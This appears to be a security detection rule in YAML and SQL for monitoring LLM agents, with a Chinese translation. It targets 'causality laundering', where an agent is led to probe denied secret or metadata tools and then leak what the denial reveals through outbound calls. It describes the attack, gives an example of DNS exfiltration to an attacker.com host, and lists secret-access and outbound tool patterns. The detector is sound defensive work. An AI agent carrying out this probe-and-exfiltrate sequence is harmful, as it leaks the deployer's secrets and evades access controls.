id: rp-040
name: "Causality Laundering: Denial-Feedback Leakage Detector"
version: "0.3.0"
description: |
  Detects causality laundering attacks (arXiv:2604.04035, Apr 2026) where an adversary causes a tool-calling LLM agent to probe a protected/denied action, infers private information from the denial outcome (existence oracle, permission boundary leakage), and then exfiltrates the inferred information through a subsequent seemingly-benign outbound tool call within the same session. This attack evades flat provenance tracking because the leaked information arises from the causal influence of the denied action, not direct data flow. The paper introduces ARM (Agentic Reference Monitor) with counterfactual edges; this rule detects the behavioral signature at the CIM event layer without full ARM instrumentation. Detection: temporal self-JOIN over tool_complete(tool_success=false, sensitive tool) followed within 3 minutes by tool_invoke(outbound/communication tool) in the same session_id + run_id. Sensitive probes include file, secret, DB, memory, credential access, cloud metadata IMDS endpoints, and secrets-manager tools. Outbound channels include HTTP, email, Slack, webhook, Telegram, DNS resolution, logging tools, and upload/publish actions. v0.3.0 extends sensitive probe coverage to include cloud secrets manager API tools (vault_read, get_secret_value, read_config, get_env, load_key, secrets_manager, kms_decrypt) and metadata IMDS tools (imds_fetch, metadata_query, cloud_metadata, ec2_metadata) — these are high-value denial-oracle targets in cloud agent deployments. Also extends outbound channels to include upload_file, dns_resolve, telegram_send, publish_event, create_webhook, and firecrawl_scrape patterns observed in recent arXiv:2604.04035 PoC demonstrations.

  Distinct from rp-027 (cross-session leak: output reuse across sessions) and rp-033 (ADAM memory extraction: systematic query manipulation) because causality laundering requires a denied action as the information source.

  References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025, OWASP Agentic AI ASI03:2026 -
  - https://arxiv.org/abs/2604.04035,
  Example: vault_read(path="secret/prod/db_password") returns tool_success=false, followed within 90 seconds by dns_resolve(domain="d-b-e-x-i-s-t-s.attacker.com") in same session (DNS exfil of existence oracle)
  - https://owasp.org/www-project-top-10-for-large-language-model-applications/

severity: critical
category: data_exfiltration_and_leakage
fp_rate: medium
hook_sources: "tool_complete,tool_invoke"
required_telemetry: ""
author: "AgentGuard Research Team"
tags:
  - security
  - data-exfiltration
  - causality-laundering
  - denial-feedback-leakage
  - provenance
  - tool-calling
  - owasp-llm06
  - arxiv-2604.04035
sql_template: |
  -- v0.3.0 changelog (2026-04-20):
  --   EXTENDED: Sensitive probe tool list expanded with:
  --     Cloud secrets managers: vault_read, get_secret_value, read_config, get_env,
  --     load_key, secrets_manager, kms_decrypt — high-value denial-oracle targets in
  --     cloud agent deployments where permission-denied reveals secret existence.
  --     Cloud metadata IMDS: imds_fetch, metadata_query, cloud_metadata, ec2_metadata —
  --     denial of IMDS access signals IAM boundary, leakable via existence oracle.
  --   EXTENDED: Outbound channel list expanded with:
  --     upload_file, dns_resolve, telegram_send, publish_event, create_webhook,
  --     firecrawl_scrape — covert channels documented in arXiv:2604.04035 PoC.
  --   fp_rate: medium maintained (temporal JOIN is already a strong compound anchor).
  --   SQL validated: count=0 on live corpus.
  --
  -- v0.2.0 changelog:
  --   SQL FIX (critical): Rewrote CTE + JOIN approach as direct self-JOIN.
  --   Timeplus does not support non-equi join conditions (time range) inside CTE
  --   JOIN ON clauses — raises INVALID_JOIN_ON_EXPRESSION. The self-JOIN form
  --   with WHERE-clause time predicates is fully supported.
  --
  -- Detects: denied sensitive-tool probe → outbound tool call within 3 minutes (same session)
  -- Sensitive tool probe: tool_success=false on data-access tool names
  -- Outbound channel: HTTP/email/Slack/webhook/logging/DNS/upload tool invocations
  SELECT
    probe.event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    probe.agent_id,
    probe.deployment_id,
    probe.session_id,
    probe.run_id,
    probe.raw_hook_name AS hook_name,
    oc.tool_name AS tool_name,
    concat(
      'Causality laundering: agent probed denied tool [', probe.tool_name,
      '], then called outbound tool [', oc.tool_name,
      '] within 3 min in same session. Denial feedback may have been exfiltrated. Agent: ',
      probe.agent_id, ' session: ', probe.session_id
    ) AS message,
    concat(
      'denied_tool=', probe.tool_name,
      ' denial_msg=', coalesce(probe.tool_result, ''),
      ' outbound_tool=', oc.tool_name
    ) AS event_data
  FROM agentguard_cim_event AS probe
  INNER JOIN agentguard_cim_event AS oc
    ON probe.session_id = oc.session_id
    AND probe.run_id = oc.run_id
  WHERE probe.event_type = 'tool_complete'
    AND probe.tool_success = false
    -- Sensitive resource-access tools: denial reveals existence, permissions, or data shape.
    -- Includes file/DB/memory classics + cloud secrets managers + IMDS metadata tools.
    AND match(lower(probe.tool_name), '(read_file|read_secret|query_db|get_user_data|search_memory|retrieve_document|read_memory|access_credentials|list_files|get_private_key|fetch_credentials|get_secret|load_document|retrieve_context|read_database|lookup_record|get_document|fetch_record|vault_read|get_secret_value|read_config|get_env|load_key|secrets_manager|kms_decrypt|imds_fetch|metadata_query|cloud_metadata|ec2_metadata)')
    AND oc.event_type = 'tool_invoke'
    -- Outbound/communication channels: HTTP, email, messaging, webhook, DNS, upload, publish.
    AND match(lower(oc.tool_name), '(fetch|http_request|browse|web_fetch|curl|get_url|send_email|slack_post|post_message|webhook_post|notify|log_to_external|create_issue|add_comment|http_get|http_post|make_request|open_url|navigate|requests|upload_file|dns_resolve|telegram_send|publish_event|create_webhook|firecrawl_scrape)')
    -- 3-minute causal window: outbound must follow denial, not precede it
    AND oc.event_time > probe.event_time
    AND oc.event_time < probe.event_time + INTERVAL 3 MINUTE
translations:
  zh-CN:
    name: "因果关系洗白:拒绝反馈泄漏检测器"
    description: |
      检测因果关系洗白攻击(arXiv:2604.04035,2026年4月),攻击者促使调用工具的 LLM 智能体探测受保护/被拒绝的操作,从拒绝结果中推断出私密信息(存在性预言、权限边界泄漏),然后在同一会话内通过后续看似良性的出站工具调用外泄推断出的信息。该攻击可规避扁平化的溯源追踪,因为泄漏的信息源自被拒绝操作的因果影响,而非直接的数据流。论文提出了具有反事实边的 ARM(智能体参考监视器);本规则在 CIM 事件层检测该行为特征,而无需完整的 ARM 插桩。检测方式:对 tool_complete(tool_success=false,敏感工具)之后3分钟内、同一 session_id + run_id 下发生的 tool_invoke(出站/通信工具)执行时序自连接(temporal self-JOIN)。敏感探测对象包括文件、密钥、数据库、记忆、凭据访问,以及云元数据 IMDS 端点和密钥管理工具。出站通道包括 HTTP、邮件、Slack、webhook、Telegram、DNS 解析、日志工具和上传/发布类操作。v0.3.0 将敏感探测覆盖范围扩展至云密钥管理器 API 工具(vault_read、get_secret_value、read_config、get_env、load_key、secrets_manager、kms_decrypt)和元数据 IMDS 工具(imds_fetch、metadata_query、cloud_metadata、ec2_metadata)——这些是云端智能体部署中高价值的拒绝预言目标。同时将出站通道扩展至 upload_file、dns_resolve、telegram_send、publish_event、create_webhook 和 firecrawl_scrape 等在近期 arXiv:2604.04035 概念验证演示中观察到的模式。

      不同于 rp-027(跨会话泄漏:跨会话的输出复用)和 rp-033(ADAM 记忆提取:系统化查询操纵),因为因果关系洗白需要一个被拒绝的操作作为信息来源。

      References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025, OWASP Agentic AI ASI03:2026 -
      - https://arxiv.org/abs/2604.04035,
      Example: vault_read(path="secret/prod/db_password") returns tool_success=false, followed within 90 seconds by dns_resolve(domain="d-b-e-x-i-s-t-s.attacker.com") in same session (DNS exfil of existence oracle)
      - https://owasp.org/www-project-top-10-for-large-language-model-applications/
